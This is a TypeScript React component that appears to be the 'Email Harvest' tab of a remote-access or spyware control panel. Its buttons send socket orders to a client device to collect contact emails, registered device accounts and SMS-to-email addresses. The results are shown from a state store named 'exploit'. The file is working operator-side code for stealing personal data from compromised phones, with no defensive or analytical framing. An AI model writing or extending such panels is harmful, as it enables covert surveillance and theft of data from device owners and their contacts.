
import { Mail, RefreshCw, AtSign, Smartphone, MessageSquare } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

// Emails tab — fetches contact emails, device accounts and SMS-emails from the
// device. The shape of each entry is device-dependent, so we render the most
// common fields (email/address/type/name) defensively.
export function EmailsTab({ clientId }: { clientId: string }) {
  const contactEmails = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.contactEmails ?? [],
  )
  const deviceAccounts = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.deviceAccounts ?? [],
  )
  const smsEmails = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.smsEmails ?? [],
  )

  const renderEmailField = (e: any): string => {
    if (!e || typeof e !== 'object') return ''
    return String(e.email ?? e.address ?? e.account ?? e.name ?? '')
  }
  const renderNameField = (e: any): string => {
    if (!e || typeof e !== 'object') return ''
    return String(e.name ?? e.displayName ?? e.type ?? e.account ?? '')
  }
  const renderTypeField = (e: any): string => {
    if (!e || typeof e !== 'object') return ''
    return String(e.type ?? e.accountType ?? '')
  }

  return (
    <div className="space-y-5">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div className="flex items-center gap-2">
          <Mail className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">Email Harvest</h3>
        </div>
        <div className="flex flex-wrap gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'emails')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <AtSign className="h-3.5 w-3.5" /> Contact
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'accounts')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <Smartphone className="h-3.5 w-3.5" /> Accounts
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'sms_emails')}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
          >
            <MessageSquare className="h-3.5 w-3.5" /> SMS
          </Button>
          <Button
            size="sm"
            onClick={() => emitOrder(clientId, 'emails_all')}
            className="bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
          >
            <RefreshCw className="h-3.5 w-3.5" /> Fetch All
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Contact emails */}
        <Card
          title="Contact Emails"
          icon={AtSign}
          count={contactEmails.length}
        >
          <EmailList
            items={contactEmails}
            primary={renderEmailField}
            secondary={renderNameField}
            tertiary={renderTypeField}
            emptyHint="No contact emails."
          />
        </Card>

        {/* Device accounts */}
        <Card
          title="Device Accounts"
          icon={Smartphone}
          count={deviceAccounts.length}
        >
          <EmailList
            items={deviceAccounts}
            primary={renderEmailField}
            secondary={renderNameField}
            tertiary={renderTypeField}
            emptyHint="No device accounts."
          />
        </Card>

        {/* SMS-to-email */}
        <Card title="SMS Emails" icon={MessageSquare} count={smsEmails.length}>
          <EmailList
            items={smsEmails}
            primary={renderEmailField}
            secondary={renderNameField}
            tertiary={renderTypeField}
            emptyHint="No SMS emails."
          />
        </Card>
      </div>

      <p className="text-[11px] text-zinc-600">
        Fetches email addresses from contacts, registered device accounts and
        SMS-to-email gateways.
      </p>
    </div>
  )
}

function Card({
  title,
  icon: Icon,
  count,
  children,
}: {
  title: string
  icon: typeof Mail
  count: number
  children: React.ReactNode
}) {
  return (
    <div className="rounded-xl border border-white/10 bg-black/30 overflow-hidden flex flex-col">
      <div className="flex items-center justify-between bg-zinc-900/60 px-3 py-2 border-b border-white/10">
        <div className="flex items-center gap-2 text-[11px] uppercase tracking-wider text-zinc-400">
          <Icon className="h-3.5 w-3.5 text-emerald-400/80" />
          {title}
        </div>
        <span className="text-[10px] text-zinc-600">{count}</span>
      </div>
      {children}
    </div>
  )
}

function EmailList({
  items,
  primary,
  secondary,
  tertiary,
  emptyHint,
}: {
  items: any[]
  primary: (e: any) => string
  secondary: (e: any) => string
  tertiary: (e: any) => string
  emptyHint: string
}) {
  return (
    <div className="max-h-80 overflow-y-auto scrollbar-emerald divide-y divide-white/5">
      {items.length === 0 ? (
        <div className="px-3 py-8 text-center text-xs text-zinc-600">
          {emptyHint}
        </div>
      ) : (
        items.map((e, i) => {
          const email = primary(e)
          const name = secondary(e)
          const type = tertiary(e)
          return (
            <div
              key={i}
              className="px-3 py-2 text-xs hover:bg-white/[0.03]"
            >
              <div className="flex items-center gap-2">
                <Mail className="h-3 w-3 shrink-0 text-emerald-400/70" />
                <span className="font-mono text-zinc-200 truncate">{email}</span>
              </div>
              {(name || type) && (
                <div className="ml-5 mt-0.5 flex gap-2 text-[10px] text-zinc-500 truncate">
                  {name && <span>{name}</span>}
                  {type && <span className="text-zinc-600">· {type}</span>}
                </div>
              )}
            </div>
          )
        })
      )}
    </div>
  )
}
